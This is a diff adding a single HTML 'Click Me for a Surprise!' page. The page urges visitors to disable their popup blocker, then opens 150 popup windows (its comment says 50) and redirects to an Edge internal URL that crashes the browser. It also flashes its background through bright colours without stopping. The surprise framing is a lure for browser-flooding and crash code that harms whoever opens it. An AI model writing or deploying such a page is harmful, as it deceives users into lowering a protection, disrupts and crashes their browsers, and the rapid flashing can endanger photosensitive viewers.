@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click Me!</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            position: relative;
+            text-align: center;
+        }
+        
+        button {
+            padding: 20px 40px;
+            font-size: 24px;
+            font-weight: bold;
+            background-color: #FF5733;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        button:hover {
+            background-color: #C70039;
+        }
+        
+        .arrow {
+            position: absolute;
+            font-size: 50px;
+            color: red;
+            animation: bounce 1s infinite;
+        }
+        
+        .arrow.up { top: 10%; left: 50%; transform: translateX(-50%) rotate(180deg); }
+        .arrow.down { bottom: 10%; left: 50%; transform: translateX(-50%); }
+        .arrow.left { left: 10%; top: 50%; transform: translateY(-50%) rotate(90deg); }
+        .arrow.right { right: 10%; top: 50%; transform: translateY(-50%) rotate(-90deg); }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        @keyframes flash {
+            0% { background-color: red; }
+            25% { background-color: blue; }
+            50% { background-color: green; }
+            75% { background-color: yellow; }
+            100% { background-color: purple; }
+        }
+        
+        .popup-warning {
+            font-size: 20px;
+            color: black;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="arrow up">&#x2193;</div>
+    <div class="arrow down">&#x2191;</div>
+    <div class="arrow left">&#x2192;</div>
+    <div class="arrow right">&#x2190;</div>
+    
+    <button onclick="openPopup()">🔥 Click Me for a Surprise! 🔥</button>
+    <p class="popup-warning">🚨 Make sure to disable your popup blocker for the full experience! 🚨</p>
+    
+    <script>
+        function openPopup() {
+            // Open 50 windows at random positions
+            for (let i = 0; i < 150; i++) {
+                setTimeout(function() {
+                    let width = 600;
+                    let height = 400;
+                    let randomLeft = Math.floor(Math.random() * (window.innerWidth - width));
+                    let randomTop = Math.floor(Math.random() * (window.innerHeight - height));
+                    
+                    let newWindow = window.open('', '_blank', `width=${width},height=${height},left=${randomLeft},top=${randomTop}`);
+                    if (newWindow) {
+                        newWindow.document.write('<h1 style="text-align:center; font-size:50px;">SURPRISE! :)</h1>');
+                        newWindow.document.body.style.backgroundColor = 'pink';
+                    } else {
+                        alert("Popup blocked! Please disable your popup blocker and try again.");
+                        return;
+                    }
+                }, i * 100);
+            }
+
+            // After opening 50 windows, redirect to the crash page
+            setTimeout(function() {
+                window.location.href = "edge://inducebrowsercrashforrealz/";
+            }, 5100); // Delay redirect after windows open
+        }
+        
+        function flashBackground() {
+            document.body.style.animation = "flash 1s infinite";
+        }
+        flashBackground();
+    </script>
+</body>
+</html>
